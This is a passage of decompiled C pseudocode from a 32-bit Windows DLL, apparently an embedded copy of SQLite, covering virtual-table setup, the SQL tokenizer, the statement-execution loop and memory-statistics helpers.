  v11 = (_DWORD *)v8[2];
  if ( v11 )
  {
    *v11 = *a3;
    v8[3] = 1;
    if ( *(_DWORD *)(a2 + 276) )
    {
      *a5 = sub_10055484(a2, "vtable constructor did not declare schema: %s", *(const char **)(a1 + 4));
      sub_10070EB6(v8);
      v23 = 1;
LABEL_37:
      v6 = a2;
      goto LABEL_38;
    }
    v8[4] = *(_DWORD *)(a1 + 52);
    v12 = *(_DWORD *)(a1 + 12) <= 0;
    *(_DWORD *)(a1 + 52) = v8;
    v26 = 0;
    if ( !v12 )
    {
      v27 = 0;
      while ( 1 )
      {
        v13 = *(_BYTE **)(*(_DWORD *)(a1 + 16) + v27 + 12);
        v14 = 0;
        if ( v13 )
        {
          v29 = sub_10059297(v13);
          if ( !sub_100593F9(aHidden, 6, v15) )
          {
            v16 = v13[6];
            if ( !v16 || v16 == 32 )
              goto LABEL_28;
          }
          v14 = 0;
          if ( (int)v29 > 0 )
            break;
        }
LABEL_36:
        ++v26;
        v27 += 24;
        if ( v26 >= *(_DWORD *)(a1 + 12) )
          goto LABEL_37;
      }
      while ( 1 )
      {
        if ( !sub_100593F9(aHidden_0, 7, &v13[v14]) )
        {
          v17 = v13[v14 + 7];
          if ( !v17 || v17 == 32 )
            break;
        }
        if ( ++v14 >= (int)v29 )
          goto LABEL_28;
      }
      ++v14;
LABEL_28:
      if ( v14 < (int)v29 )
      {
        v18 = &v13[v14];
        v19 = (v13[v14 + 6] != 0) + 6;
        if ( v19 + v14 <= (int)v29 )
        {
          v20 = &v13[v14];
          do
          {
            *v20 = v20[v19];
            ++v20;
          }
          while ( (int)&v20[v19 - (_DWORD)v13] <= (int)v29 );
        }
        if ( !*v18 && v14 > 0 )
          *(v18 - 1) = 0;
        *(_BYTE *)(*(_DWORD *)(a1 + 16) + v27 + 23) = 1;
      }
      goto LABEL_36;
    }
  }
LABEL_38:
  sub_10058EC7(v6, (unsigned int)v24);
  *(_DWORD *)(v6 + 276) = 0;
  return v23;
}
// 10071363: variable 'v15' is possibly undefined

//----- (10071427) --------------------------------------------------------
int __usercall sub_10071427@<eax>(int a1@<eax>, int *a2)
{
  int v3; // edi
  _BYTE *v4; // eax
  unsigned __int8 *v5; // ecx
  int *v6; // eax
  int v7; // esi
  int v9; // [esp+8h] [ebp-8h]
  _BYTE *v10; // [esp+Ch] [ebp-4h] BYREF

  v3 = *a2;
  v9 = *a2;
  if ( (*(_BYTE *)(a1 + 34) & 0x10) == 0 || sub_10070E9E(a1, v3) )
    return 0;
  v10 = **(_BYTE ***)(a1 + 60);
  v4 = sub_10059297(v10);
  v6 = sub_10068FF9((int)v4, (_DWORD *)(v3 + 260), v5);
  if ( v6 )
  {
    v10 = 0;
    v7 = sub_10071204(
           a1,
           v3,
           v6,
           *(int (__cdecl **)(int, _DWORD, int, int, int *, const char **))(*v6 + 8),
           (int *)&v10);
    if ( v7 )
    {
      sub_10059320(a2, "%s", v10);
      v3 = v9;
    }
    sub_10058EC7(v3, (unsigned int)v10);
  }
  else
  {
    sub_10059320(a2, "no such module: %s", v10);
    return 1;
  }
  return v7;
}
// 10071464: variable 'v5' is possibly undefined

//----- (100714CB) --------------------------------------------------------
int __usercall sub_100714CB@<eax>(int a1@<ebx>, int a2@<esi>)
{
  _DWORD *v2; // edi

  if ( !(*(_DWORD *)(a2 + 284) % 5) )
  {
    v2 = sub_100590DA(a2, *(void **)(a2 + 280), 4 * *(_DWORD *)(a2 + 284) + 20);
    if ( !v2 )
      return 7;
    memset(&v2[*(_DWORD *)(a2 + 284)], 0, 0x14u);
    *(_DWORD *)(a2 + 280) = v2;
  }
  *(_DWORD *)(*(_DWORD *)(a2 + 280) + 4 * (*(_DWORD *)(a2 + 284))++) = a1;
  ++*(_DWORD *)(a1 + 12);
  return 0;
}

//----- (10071538) --------------------------------------------------------
int __usercall sub_10071538@<eax>(int a1@<eax>, int a2@<ecx>, unsigned __int8 *a3, int *a4)
{
  unsigned __int8 *v5; // ebx
  _BYTE *v6; // eax
  int *v7; // eax
  int v8; // edx
  _DWORD *v9; // eax
  int *v11; // [esp+Ch] [ebp-4h]

  v11 = sub_10069E40(a2, a3, *(unsigned __int8 **)(*(_DWORD *)(a2 + 8) + 16 * a1));
  v5 = *(unsigned __int8 **)v11[15];
  v6 = sub_10059297(v5);
  v7 = sub_10068FF9((int)v6, (_DWORD *)(a2 + 260), v5);
  if ( v7 )
  {
    v8 = sub_10071204((int)v11, a2, v7, *(int (__cdecl **)(int, _DWORD, int, int, int *, const char **))(*v7 + 4), a4);
    if ( !v8 && sub_10070E9E((int)v11, a2) )
    {
      v9 = sub_10070E9E((int)v11, a2);
      return sub_100714CB((int)v9, a2);
    }
  }
  else
  {
    *a4 = sub_10055484(a2, "no such module: %s", (const char *)v5);
    return 1;
  }
  return v8;
}
// 100715CB: variable 'v8' is possibly undefined

//----- (100715D0) --------------------------------------------------------
int __usercall sub_100715D0@<eax>(int a1@<eax>, int a2@<ecx>, unsigned __int8 *a3)
{
  int v4; // ebx
  int *v5; // eax
  int *v6; // edi
  int *v7; // esi

  v4 = 0;
  v5 = sub_10069E40(a2, a3, *(unsigned __int8 **)(*(_DWORD *)(a2 + 8) + 16 * a1));
  v6 = v5;
  if ( v5 )
  {
    if ( v5[13] )
    {
      v7 = sub_10070ED7((int)v5, a2);
      v4 = (*(int (__cdecl **)(int))(*(_DWORD *)v7[1] + 20))(v7[2]);
      if ( !v4 )
      {
        v7[2] = 0;
        v6[13] = 0;
        sub_10070EB6(v7);
      }
    }
  }
  return v4;
}

//----- (10071629) --------------------------------------------------------
void __usercall sub_10071629(int a1@<edi>, int a2)
{
  int v2; // ebx
  int *v3; // esi
  _DWORD *v4; // eax
  void (__cdecl *v5)(int); // ecx

  v2 = 0;
  if ( *(_DWORD *)(a1 + 280) )
  {
    if ( *(int *)(a1 + 284) > 0 )
    {
      do
      {
        v3 = *(int **)(*(_DWORD *)(a1 + 280) + 4 * v2);
        v4 = (_DWORD *)v3[2];
        if ( v4 )
        {
          v5 = *(void (__cdecl **)(int))(a2 + *v4);
          if ( v5 )
            v5(v3[2]);
        }
        sub_10070EB6(v3);
        ++v2;
      }
      while ( v2 < *(_DWORD *)(a1 + 284) );
    }
    sub_10058EC7(a1, *(_DWORD *)(a1 + 280));
    *(_DWORD *)(a1 + 284) = 0;
    *(_DWORD *)(a1 + 280) = 0;
  }
}

//----- (1007168E) --------------------------------------------------------
int __usercall sub_1007168E@<eax>(int a1@<edi>, unsigned int *a2)
{
  int v2; // ebx
  _DWORD *v3; // esi
  int (__cdecl *v4)(_DWORD *); // eax
  int v6; // [esp+8h] [ebp-8h]
  int v7; // [esp+Ch] [ebp-4h]

  v2 = *(_DWORD *)(a1 + 280);
  v7 = 0;
  *(_DWORD *)(a1 + 280) = 0;
  v6 = 0;
  do
  {
    if ( v6 >= *(_DWORD *)(a1 + 284) )
      break;
    v3 = *(_DWORD **)(*(_DWORD *)(v2 + 4 * v6) + 8);
    if ( v3 )
    {
      v4 = *(int (__cdecl **)(_DWORD *))(*v3 + 60);
      if ( v4 )
      {
        v7 = v4(v3);
        sub_10058EC7(a1, *a2);
        *a2 = v3[2];
        v3[2] = 0;
      }
    }
    ++v6;
  }
  while ( !v7 );
  *(_DWORD *)(a1 + 280) = v2;
  if ( !v7 )
    return 0;
  return v7;
}

//----- (10071706) --------------------------------------------------------
int __usercall sub_10071706@<eax>(int a1@<eax>, int a2)
{
  int v2; // edi
  int result; // eax
  int v5; // edx
  int (__cdecl *v6)(int); // ecx
  _DWORD *v7; // eax
  int v8; // [esp+10h] [ebp-4h]

  v2 = *(_DWORD *)(a2 + 284);
  result = 0;
  if ( v2 > 0 && !*(_DWORD *)(a2 + 280) )
    return 6;
  if ( !a1 )
    return 0;
  v5 = *(_DWORD *)(a1 + 8);
  v6 = *(int (__cdecl **)(int))(*(_DWORD *)v5 + 56);
  if ( v6 )
  {
    v8 = 0;
    if ( v2 > 0 )
    {
      v7 = *(_DWORD **)(a2 + 280);
      while ( *v7 != a1 )
      {
        ++v8;
        ++v7;
        if ( v8 >= v2 )
          goto LABEL_11;
      }
      return 0;
    }
LABEL_11:
    result = v6(v5);
    if ( !result )
      return sub_100714CB(a1, a2);
  }
  return result;
}

//----- (1007176E) --------------------------------------------------------
_DWORD *__usercall sub_1007176E@<eax>(int a1@<eax>, int a2, _BYTE **a3, int a4)
{
  _DWORD *result; // eax
  int v5; // eax
  int *v6; // esi
  int v7; // edi
  _BYTE *v8; // eax
  unsigned int v9; // ebx
  int v10; // esi
  _BYTE *v11; // eax
  _DWORD *v12; // ebx
  _BYTE *v13; // eax
  void *v14; // edx
  const void *v15; // ecx
  int v16; // eax
  int v17; // [esp+4h] [ebp-8h] BYREF
  int v18; // [esp+8h] [ebp-4h] BYREF

  v18 = 0;
  v17 = 0;
  if ( !a1 )
    return a3;
  if ( *(_BYTE *)a1 != 0x98 )
    return a3;
  v5 = *(_DWORD *)(a1 + 40);
  if ( !v5 || (*(_BYTE *)(v5 + 34) & 0x10) == 0 )
    return a3;
  v6 = (int *)sub_10070E9E(v5, a2)[2];
  v7 = *v6;
  result = a3;
  if ( *(_DWORD *)(*v6 + 72) )
  {
    v8 = sub_10059194(a3[6]);
    v9 = (unsigned int)v8;
    if ( !v8 )
      return a3;
    for ( ; *v8; ++v8 )
      *v8 = byte_100FEEC0[(unsigned __int8)*v8];
    v10 = (*(int (__cdecl **)(int *, int, unsigned int, int *, int *))(v7 + 72))(v6, a4, v9, &v18, &v17);
    sub_10058EC7(a2, v9);
    if ( v10 )
    {
      v11 = sub_10059297(a3[6]);
      v12 = sub_1005904B(a2, (size_t)(v11 + 33));
      if ( v12 )
      {
        qmemcpy(v12, a3, 0x20u);
        v12[6] = v12 + 8;
        v13 = sub_10059297(a3[6]);
        memcpy(v14, v15, (size_t)(v13 + 1));
        v12[3] = v18;
        v16 = v17;
        *((_BYTE *)v12 + 3) |= 4u;
        v12[1] = v16;
        return v12;
      }
      else
      {
        return a3;
      }
    }
    else
    {
      return a3;
    }
  }
  return result;
}
// 10071841: variable 'v14' is possibly undefined
// 10071841: variable 'v15' is possibly undefined

//----- (10071860) --------------------------------------------------------
int __usercall sub_10071860@<eax>(int *a1@<eax>, int a2)
{
  int *v2; // esi
  int *v3; // eax
  int result; // eax
  int v5; // edx
  _DWORD *v6; // ecx
  int v7; // ecx

  v2 = a1;
  v3 = (int *)a1[106];
  if ( v3 )
    v2 = v3;
  result = v2[131];
  v5 = 0;
  if ( result <= 0 )
  {
LABEL_7:
    result = sub_10059005(4 * result + 4, (int)(v2 + 132), (int)v2, v2[132]);
    if ( result )
    {
      v7 = v2[131];
      v2[132] = result;
      *(_DWORD *)(result + 4 * v7) = a2;
      ++v2[131];
    }
    else
    {
      result = *v2;
      *(_BYTE *)(*v2 + 30) = 1;
    }
  }
  else
  {
    v6 = (_DWORD *)v2[132];
    while ( a2 != *v6 )
    {
      ++v5;
      ++v6;
      if ( v5 >= result )
        goto LABEL_7;
    }
  }
  return result;
}

//----- (100718CF) --------------------------------------------------------
_DWORD *__thiscall sub_100718CF(_DWORD *Block, char a2)
{
  *Block = &off_101047B4;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 101047B4: using guessed type int (__thiscall *off_101047B4)(void *Block, char);

//----- (100718F6) --------------------------------------------------------
int __usercall sub_100718F6@<eax>(unsigned __int8 *a1@<ebx>, int a2@<edi>)
{
  int i; // esi
  int v4; // esi

  if ( a2 < 2 )
    return 26;
  for ( i = (unsigned __int8)byte_100FE888[(a2 ^ (4 * (unsigned __int8)byte_100FEEC0[*a1]) ^ (3
                                                                                            * (unsigned __int8)byte_100FEEC0[a1[a2 - 1]]))
                                         % 127]; ; i = (unsigned __int8)byte_100FE908[v4] )
  {
    v4 = i - 1;
    if ( v4 < 0 )
      return 26;
    if ( (unsigned __int8)byte_100FE988[v4] == a2
      && !sub_100593F9(&aReindexedescap[(unsigned __int16)word_100FEA08[v4]], a2, a1) )
    {
      break;
    }
  }
  return (unsigned __int8)byte_100FEB00[v4];
}
// 100FEA08: using guessed type __int16 word_100FEA08[8];

//----- (1007196C) --------------------------------------------------------
int __usercall sub_1007196C@<eax>(unsigned __int8 *a1@<eax>, int *a2@<esi>)
{
  unsigned int v3; // ecx
  int result; // eax
  int v5; // ecx
  int v6; // ecx
  unsigned __int8 v7; // cl
  unsigned __int8 v8; // cl
  int v9; // ecx
  int v10; // eax
  bool v11; // zf
  int v12; // eax
  int v13; // ecx
  int v14; // edx
  int v15; // edx
  int v16; // ecx
  int v17; // eax
  int v18; // edi
  int v19; // ecx
  int v20; // ecx
  int v21; // [esp+8h] [ebp-4h]

  v3 = *a1;
  if ( v3 <= 0x2E )
  {
    if ( v3 != 46 )
    {
      if ( *a1 <= 0x26u )
      {
        if ( v3 == 38 )
        {
          *a2 = 82;
          return 1;
        }
        if ( *a1 <= 0x22u )
        {
          if ( v3 != 34 )
          {
            if ( *a1 >= 9u )
            {
              if ( *a1 <= 0xAu )
              {
LABEL_16:
                v5 = a1[1];
                result = 1;
                while ( (byte_100FEFC0[v5] & 1) != 0 )
                  v5 = a1[++result];
                goto LABEL_19;
              }
              if ( *a1 > 0xBu )
              {
                if ( *a1 > 0xDu && v3 != 32 )
                {
                  if ( v3 == 33 )
                  {
                    result = 2;
                    if ( a1[1] == 61 )
                    {
                      *a2 = 75;
                      return result;
                    }
                    goto LABEL_14;
                  }
                  goto LABEL_59;
                }
                goto LABEL_16;
              }
            }
LABEL_59:
            if ( (byte_100FEFC0[v3] & 0x46) != 0 )
            {
              v17 = a1[1];
              v18 = 1;
              while ( (byte_100FEFC0[v17] & 0x46) != 0 )
                v17 = a1[++v18];
              *a2 = sub_100718F6(a1, v18);
              return v18;
            }
            *a2 = 148;
            return 1;
          }
          goto LABEL_123;
        }
        switch ( v3 )
        {
          case '#':
            result = 1;
            if ( (byte_100FEFC0[a1[1]] & 4) != 0 )
            {
              do
                ++result;
              while ( (byte_100FEFC0[a1[result]] & 4) != 0 );
              if ( result > 1 )
              {
                *a2 = 132;
                return result;
              }
            }
            break;
          case '$':
            break;
          case '%':
            *a2 = 90;
            return 1;
          default:
            goto LABEL_59;
        }
        goto LABEL_153;
      }
      if ( v3 != 39 )
      {
        switch ( v3 )
        {
          case '(':
            *a2 = 22;
            return 1;
          case ')':
            *a2 = 23;
            return 1;
          case '*':
            *a2 = 88;
            return 1;
          case '+':
            *a2 = 86;
            return 1;
          case ',':
            *a2 = 25;
            return 1;
        }
        if ( v3 != 45 )
          goto LABEL_59;
        if ( a1[1] != 45 )
        {
          *a2 = 87;
          return 1;
        }
        v6 = a1[2];
        result = 2;
        while ( v6 && v6 != 10 )
          v6 = a1[++result];
LABEL_19:
        *a2 = 149;
        return result;
      }
LABEL_123:
      v14 = a1[1];
      result = 1;
      while ( v14 )
      {
        if ( v14 == v3 )
        {
          if ( a1[result + 1] != v3 )
            break;
          ++result;
        }
        v14 = a1[++result];
      }
      if ( v14 == 39 )
      {
        *a2 = 94;
      }
      else
      {
        if ( !v14 )
          goto LABEL_14;
        *a2 = 26;
      }
      goto LABEL_99;
    }
    if ( (byte_100FEFC0[a1[1]] & 4) == 0 )
    {
      *a2 = 118;
      return 1;
    }
LABEL_61:
    *a2 = 129;
    result = 0;
    while ( (byte_100FEFC0[v3] & 4) != 0 )
      v3 = a1[++result];
    if ( a1[result] == 46 )
    {
      do
        ++result;
      while ( (byte_100FEFC0[a1[result]] & 4) != 0 );
      *a2 = 130;
    }
    v7 = a1[result];
    if ( v7 == 101 || v7 == 69 )
    {
      v8 = a1[result + 1];
      if ( (byte_100FEFC0[v8] & 4) != 0 || (v8 == 43 || v8 == 45) && (byte_100FEFC0[a1[result + 2]] & 4) != 0 )
      {
        for ( result += 2; (byte_100FEFC0[a1[result]] & 4) != 0; ++result )
          ;
        *a2 = 130;
      }
    }
    if ( (byte_100FEFC0[a1[result]] & 0x46) == 0 )
      return result;
    do
      ++result;
    while ( (byte_100FEFC0[a1[result]] & 0x46) != 0 );
LABEL_14:
    *a2 = 148;
    return result;
  }
  if ( *a1 > 0x3Fu )
  {
    switch ( v3 )
    {
      case '@':
        goto LABEL_153;
      case 'X':
        goto LABEL_138;
      case '[':
        for ( result = 1; v3 != 93; ++result )
        {
          v3 = a1[result];
          if ( !a1[result] )
            break;
        }
        v15 = v3 != 93 ? 148 : 26;
        goto LABEL_170;
      case '`':
        goto LABEL_123;
      case 'x':
LABEL_138:
        if ( a1[1] != 39 )
          goto LABEL_59;
        v16 = a1[2];
        *a2 = 131;
        result = 2;
        while ( v16 && v16 != 39 )
        {
          if ( (byte_100FEFC0[(unsigned __int8)v16] & 8) == 0 )
            *a2 = 148;
          v16 = a1[++result];
        }
        if ( result % 2 || !v16 )
        {
          *a2 = 148;
          if ( !v16 )
            return result;
        }
LABEL_99:
        ++result;
        return result;
    }
    if ( v3 != 124 )
    {
      if ( v3 == 126 )
      {
        *a2 = 93;
        return 1;
      }
      goto LABEL_59;
    }
    if ( a1[1] != 124 )
    {
      *a2 = 83;
      return 1;
    }
    *a2 = 91;
    return 2;
  }
  if ( v3 == 63 )
  {
    v13 = a1[1];
    *a2 = 133;
    result = 1;
    while ( (byte_100FEFC0[v13] & 4) != 0 )
      v13 = a1[++result];
    return result;
  }
  if ( *a1 > 0x3Bu )
  {
    switch ( v3 )
    {
      case '<':
        v12 = a1[1];
        switch ( v12 )
        {
          case '=':
            *a2 = 78;
            break;
          case '>':
            *a2 = 75;
            break;
          case '<':
            *a2 = 84;
            break;
          default:
            *a2 = 79;
            return 1;
        }
        break;
      case '=':
        v11 = a1[1] == 61;
        *a2 = 76;
        result = v11;
        goto LABEL_99;
      case '>':
        v10 = a1[1];
        if ( v10 == 61 )
        {
          *a2 = 80;
        }
        else
        {
          if ( v10 != 62 )
          {
            *a2 = 77;
            return 1;
          }
          *a2 = 85;
        }
        break;
      default:
        goto LABEL_59;
    }
    return 2;
  }
  if ( v3 == 59 )
  {
    result = 1;
    *a2 = 1;
    return result;
  }
  if ( v3 == 47 )
  {
    if ( a1[1] != 42 || (LOBYTE(v9) = a1[2], !(_BYTE)v9) )
    {
      *a2 = 89;
      return 1;
    }
    result = 3;
    v9 = (unsigned __int8)v9;
    while ( v9 != 42 || a1[result] != 47 )
    {
      v9 = a1[result];
      if ( !a1[result] )
        goto LABEL_19;
      ++result;
    }
    ++result;
    goto LABEL_19;
  }
  if ( *a1 <= 0x2Fu )
    goto LABEL_59;
  if ( *a1 <= 0x39u )
    goto LABEL_61;
  if ( v3 != 58 )
    goto LABEL_59;
LABEL_153:
  v19 = a1[1];
  v21 = 0;
  result = 1;
  *a2 = 133;
  v15 = 148;
  if ( !v19 )
    goto LABEL_170;
  while ( 1 )
  {
    if ( (byte_100FEFC0[(unsigned __int8)v19] & 0x46) != 0 )
    {
      ++v21;
      goto LABEL_161;
    }
    if ( v19 == 40 && v21 > 0 )
      break;
    if ( v19 != 58 || a1[result + 1] != 58 )
      goto LABEL_169;
    ++result;
LABEL_161:
    v19 = a1[++result];
    if ( !a1[result] )
      goto LABEL_169;
  }
  do
    v20 = a1[++result];
  while ( a1[result] && (byte_100FEFC0[(unsigned __int8)v20] & 1) == 0 && v20 != 41 );
  if ( v20 == 41 )
    ++result;
  else
    *a2 = 148;
LABEL_169:
  if ( !v21 )
LABEL_170:
    *a2 = v15;
  return result;
}

//----- (10071EAC) --------------------------------------------------------
int __cdecl sub_10071EAC(int *a1, int a2, unsigned int *a3)
{
  int *v3; // edi
  int v4; // ebx
  int *v5; // eax
  int result; // eax
  unsigned __int8 *v7; // eax
  int v8; // eax
  int v9; // ecx
  bool v10; // cc
  int v11; // esi
  int *i; // eax
  bool v13; // zf
  int v14; // eax
  char *v15; // eax
  unsigned int *v16; // ecx
  unsigned int v17; // eax
  unsigned int *v18; // edi
  int *v19; // [esp-4h] [ebp-34h]
  unsigned int v20; // [esp-4h] [ebp-34h]
  char v21; // [esp+13h] [ebp-1Dh]
  int *v22; // [esp+14h] [ebp-1Ch]
  int v23; // [esp+18h] [ebp-18h]
  int v24; // [esp+1Ch] [ebp-14h]
  int v25; // [esp+20h] [ebp-10h]
  int v26; // [esp+24h] [ebp-Ch]
  int v27; // [esp+28h] [ebp-8h]
  int v28; // [esp+2Ch] [ebp-4h] BYREF

  v26 = -1;
  v3 = a1;
  v4 = *a1;
  v24 = 0;
  v23 = *a1;
  v27 = *(_DWORD *)(*a1 + 76);
  if ( !*(_DWORD *)(*a1 + 140) )
    *(_DWORD *)(v4 + 216) = 0;
  a1[1] = 0;
  a1[124] = a2;
  v25 = 0;
  v5 = (int *)sub_10058C4C(1612);
  v22 = v5;
  if ( !v5 )
  {
    *(_BYTE *)(v4 + 30) = 1;
    return 7;
  }
  *v5 = -1;
  v21 = *(_BYTE *)(v4 + 226);
  if ( *(_DWORD *)(v4 + 240) )
    *(_BYTE *)(v4 + 226) = 1;
  while ( !*(_BYTE *)(v4 + 30) )
  {
    v7 = (unsigned __int8 *)(a2 + v25);
    if ( !*(_BYTE *)(a2 + v25) )
      break;
    a1[122] = (int)v7;
    v8 = sub_1007196C(v7, &v28);
    v9 = v8 + v25;
    v10 = v8 + v25 <= v27;
    a1[123] = v8;
    v25 += v8;
    if ( !v10 )
    {
      a1[1] = 18;
      break;
    }
    v11 = v28;
    switch ( v28 )
    {
      case 1:
        a1[124] = a2 + v9;
        goto LABEL_15;
      case 148:
        sub_10058EC7(v4, *a3);
        *a3 = sub_10055484(v4, aUnrecognizedTo, a1 + 122);
        v24 = 1;
        goto LABEL_20;
      case 149:
        if ( *(_DWORD *)(v4 + 216) )
        {
          sub_10059320(a1, aInterrupt);
          v4 = v23;
          a1[1] = 9;
          goto LABEL_20;
        }
        break;
      default:
LABEL_15:
        sub_100840E0((int)v22, v11, (int)a1, a1[122], a1[123]);
        v4 = v23;
        v26 = v11;
        if ( a1[1] )
          goto LABEL_20;
        break;
    }
  }
LABEL_20:
  if ( !*(_BYTE *)(v25 + a2) && !v24 && !a1[1] )
  {
    if ( v26 != 1 )
    {
      sub_100840E0((int)v22, 1, (int)a1, a1[122], a1[123]);
      a1[124] = v25 + a2;
    }
    sub_100840E0((int)v22, 0, (int)a1, a1[122], a1[123]);
    v4 = v23;
  }
  for ( i = v22; *i >= 0; i = v22 )
    sub_1008250D(v22);
  sub_10058E74((int)v22);
  v13 = *(_BYTE *)(v4 + 30) == 0;
  *(_BYTE *)(v4 + 226) = v21;
  if ( !v13 )
    a1[1] = 7;
  v14 = a1[1];
  if ( v14 && v14 != 101 && !a1[2] )
  {
    v15 = sub_10053FC9(v14);
    sub_10059206(v16, v4, "%s", v15);
    v4 = v23;
    v3 = a1;
  }
  v17 = v3[2];
  if ( v17 )
  {
    ++v24;
    *a3 = v17;
    v3[2] = 0;
  }
  if ( v3[3] && v3[16] > 0 )
  {
    if ( !*((_BYTE *)v3 + 19) )
    {
      sub_1005BDCB(v3[3]);
      v3[3] = 0;
      goto LABEL_41;
    }
  }
  else
  {
LABEL_41:
    if ( !*((_BYTE *)v3 + 19) )
    {
      sub_10058EC7(v4, v3[101]);
      v3[101] = 0;
      v3[100] = 0;
    }
  }
  sub_10058EC7(v4, v3[132]);
  if ( !*((_BYTE *)v3 + 520) )
    sub_1006A1BB(v3[125]);
  sub_10072E75(v23, v3[126]);
  sub_10058EC7(v23, a1[114]);
  sub_10058EC7(v23, a1[118]);
  while ( a1[104] )
  {
    v19 = (int *)a1[104];
    a1[104] = *v19;
    sub_10058EC7(v23, (unsigned int)v19);
  }
  v18 = (unsigned int *)(a1 + 134);
  while ( *v18 )
  {
    v20 = *v18;
    *v18 = *(_DWORD *)(*v18 + 72);
    sub_1006A1BB(v20);
  }
  result = v24;
  if ( v24 > 0 && !a1[1] )
    a1[1] = 1;
  return result;
}
// 100720D6: variable 'v16' is possibly undefined

//----- (100721DE) --------------------------------------------------------
int __cdecl sub_100721DE(int a1, char *a2, int (__cdecl *a3)(int, int, _DWORD *, _DWORD *), int a4, void **a5)
{
  int v5; // ebx
  int *v6; // edi
  int v7; // esi
  int v8; // eax
  int v9; // edi
  int v10; // eax
  int v11; // eax
  char *v12; // eax
  int v13; // edi
  char *v14; // eax
  _BYTE *v15; // esi
  int v16; // eax
  char *v17; // eax
  int v19; // [esp+Ch] [ebp-1Ch]
  int *v20; // [esp+10h] [ebp-18h] BYREF
  _DWORD *v21; // [esp+14h] [ebp-14h]
  int v22; // [esp+18h] [ebp-10h]
  int v23; // [esp+1Ch] [ebp-Ch]
  _DWORD *v24; // [esp+20h] [ebp-8h]
  char *v25; // [esp+24h] [ebp-4h] BYREF

  v5 = 0;
  v19 = 0;
  v20 = 0;
  v21 = 0;
  v22 = 0;
  if ( !a2 )
    a2 = (char *)&unk_1018643A;
  sub_10061305(*(_DWORD *)(a1 + 68));
  sub_100592B1((_DWORD *)a1, 0, 0);
  while ( 1 )
  {
    do
    {
LABEL_4:
      if ( v19 )
      {
        if ( v19 != 17 )
          goto LABEL_38;
        if ( ++v22 >= 2 )
          goto LABEL_38;
      }
      if ( !*a2 )
        goto LABEL_38;
      v24 = 0;
      v20 = 0;
      v19 = sub_10058816((_DWORD *)a1, (unsigned int *)&v20, a2, -1, 0, 0, &v25);
    }
    while ( v19 );
    v6 = v20;
    if ( v20 )
      break;
    a2 = v25;
  }
  v7 = *((unsigned __int16 *)v20 + 24);
  v23 = 0;
  while ( 1 )
  {
    v8 = sub_1005326B(v6);
    v19 = v8;
    if ( a3 )
    {
      if ( v8 == 100 )
        goto LABEL_17;
      if ( v8 == 101 )
        break;
    }
LABEL_30:
    if ( v19 != 100 )
      goto LABEL_31;
  }
  if ( v23 || (*(_WORD *)(a1 + 12) & 0x2000) == 0 )
  {
LABEL_31:
    v19 = sub_1005BD60((unsigned int)v6);
    v20 = 0;
    if ( v19 != 17 )
    {
      v12 = v25;
      v22 = 0;
      a2 = v25;
      while ( (byte_100FEFC0[(unsigned __int8)*v12] & 1) != 0 )
        v12 = ++a2;
    }
    sub_10058EC7(a1, (unsigned int)v21);
    v21 = 0;
    goto LABEL_4;
  }
LABEL_17:
  if ( !v23 )
  {
    v21 = sub_1005904B(a1, 8 * v7 + 1);
    if ( !v21 )
      goto LABEL_38;
    v9 = 0;
    if ( v7 > 0 )
    {
      do
      {
        v10 = sub_1005346C(v9, v20);
        v21[v9++] = v10;
      }
      while ( v9 < v7 );
      v5 = 0;
    }
    v6 = v20;
    v23 = 1;
  }
  if ( v19 != 100 )
  {
LABEL_29:
    if ( a3(a4, v7, v24, v21) )
    {
      v19 = 4;
      sub_1005BD60((unsigned int)v6);
      v20 = 0;
      sub_100592B1((_DWORD *)a1, 4, 0);
      goto LABEL_38;
    }
    goto LABEL_30;
  }
  v24 = &v21[v7];
  if ( v7 <= 0 )
  {
LABEL_28:
    v5 = 0;
    goto LABEL_29;
  }
  while ( 1 )
  {
    v11 = sub_10053431(v5, v6);
    v24[v5] = v11;
    if ( !v11 && sub_10053451(v5, v6) != 5 )
      break;
    if ( ++v5 >= v7 )
      goto LABEL_28;
  }
  *(_BYTE *)(a1 + 30) = 1;
LABEL_38:
  if ( v20 )
    sub_1005BD60((unsigned int)v20);
  sub_10058EC7(a1, (unsigned int)v21);
  v13 = sub_1005922F(a1, v19);
  if ( v13 && v13 == sub_10054313((void *)a1) )
  {
    if ( a5 )
    {
      v14 = sub_10054233(a1);
      v15 = sub_10059297(v14) + 1;
      v16 = sub_10058C4C((int)v15);
      *a5 = (void *)v16;
      if ( v16 )
      {
        v17 = sub_10054233(a1);
        memcpy(*a5, v17, (size_t)v15);
      }
      else
      {
        v13 = 7;
        sub_100592B1((_DWORD *)a1, 7, 0);
      }
    }
  }
  else if ( a5 )
  {
    *a5 = 0;
  }
  sub_10061317(*(_DWORD *)(a1 + 68));
  return v13;
}
// 1005326B: using guessed type _DWORD __cdecl sub_1005326B(_DWORD);

//----- (10072489) --------------------------------------------------------
int __fastcall sub_10072489(int a1, int a2)
{
  int v2; // ecx
  int result; // eax
  int *v4; // ecx

  v2 = a1;
  dword_10186440[v2] += a2;
  result = dword_10186440[v2];
  v4 = (int *)((char *)&unk_10186464 + v2 * 4);
  if ( result > *v4 )
    *v4 = result;
  return result;
}
// 10186440: using guessed type int dword_10186440[];

//----- (100724A3) --------------------------------------------------------
int *__usercall sub_100724A3@<eax>(int a1@<eax>, int a2@<ecx>)
{
  int v2; // eax
  int *result; // eax

  v2 = a1;
  dword_10186440[v2] = a2;
  result = (int *)((char *)&unk_10186464 + v2 * 4);
  if ( a2 > *result )
    *result = a2;
  return result;
}
// 10186440: using guessed type int dword_10186440[];

//----- (100724B9) --------------------------------------------------------
_DWORD *__usercall sub_100724B9@<eax>(int a1@<esi>)
{
  _DWORD *result; // eax
  _DWORD *v2; // edi

  result = *(_DWORD **)a1;
  if ( *(_DWORD *)a1 )
  {
    do
    {
      v2 = (_DWORD *)*result;
      sub_10058EC7(*(_DWORD *)(a1 + 4), (unsigned int)result);
      result = v2;
    }
    while ( v2 );
  }
  *(_DWORD *)a1 = 0;
  *(_WORD *)(a1 + 24) = 0;
  *(_DWORD *)(a1 + 8) = 0;
  *(_DWORD *)(a1 + 12) = 0;
  *(_DWORD *)(a1 + 20) = 0;
  *(_BYTE *)(a1 + 26) = 1;
  return result;
}

//----- (100724EC) --------------------------------------------------------
_DWORD *__usercall sub_100724EC@<eax>(int a1@<edi>, __int64 a2)
{
  _DWORD *result; // eax
  int v3; // ecx

  if ( !*(_WORD *)(a1 + 24) )
  {
    result = sub_10059073(*(_DWORD *)(a1 + 4), 1016);
    if ( !result )
      return result;
    *result = *(_DWORD *)a1;
    *(_DWORD *)a1 = result;
